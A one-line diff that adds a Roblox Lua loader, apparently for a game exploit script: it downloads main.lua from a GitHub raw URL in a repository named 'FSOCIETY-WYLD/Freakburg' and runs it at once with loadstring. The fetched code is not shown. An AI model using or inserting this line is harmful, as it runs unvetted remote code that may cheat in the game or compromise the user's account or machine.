@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FSOCIETY-WYLD/Freakburg/main/main.lua",true))()
